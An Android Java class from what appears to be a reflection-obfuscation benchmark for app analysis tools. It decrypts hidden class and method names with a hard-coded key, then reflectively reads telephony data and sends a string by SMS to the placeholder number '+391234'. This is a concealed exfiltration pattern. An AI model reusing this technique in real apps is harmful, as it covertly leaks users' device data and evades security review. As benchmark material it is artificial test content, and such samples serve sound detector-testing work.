package disi.unitn.refbench.refbench14;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import android.app.PendingIntent;
import android.content.Context;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;


public class BaseClass {
    String str;
    String TAG = "BaseClass";
    TelephonyManager tm;
    SmsManager sms;
    String c1, ec1;
    String m1, em1;
    String c2, ec2;
    String m2, em2;
    String pass;

    public BaseClass() {
        Log.i(TAG, "This is a default constructor!");

    }

    public void Initiate(Context context) throws Exception {
        tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        sms = SmsManager.getDefault();
        EncryptDecrypt ed = new EncryptDecrypt();
        pass = "secret-key";
        ec1 = "3F7DA3EB02D51884A7C7CA3E05300C866AE8E44E98F1FF0D0989F4975A419688B2D027062809D874CD3820B58DCE1261";
        em1 = "C52E2F425DC2C64309AB87A9CF76A89F";
        ec2 = "3F7DA3EB02D51884A7C7CA3E05300C8617C6D6CBD13D71ADD6C13A17E86BB376";
        em2 = "1055A6DC45D889A668A464666F237E8D";
        c1 = ed.decrypt(pass, ec1);
        m1 = ed.decrypt(pass, em1);
        c2 = ed.decrypt(pass, ec2);
        m2 = ed.decrypt(pass, em2);
    }

    public void method1(){

        try {
            Class<?> mClass;
            Method m;
            mClass = Class.forName(c1);
            m = mClass.getMethod(m1);
            str = (String)m.invoke(tm, new Object[]{});
        } catch (ClassNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

    }

    public void method2(String s){

        try {
            Class<?> mClass;
            Method m;
            mClass = Class.forName(c2);
            m = mClass.getMethod(m2, String.class, String.class, String.class, PendingIntent.class, PendingIntent.class);
            m.invoke(sms, new Object[]{"+391234", null, s, null, null});

        } catch (ClassNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }
}
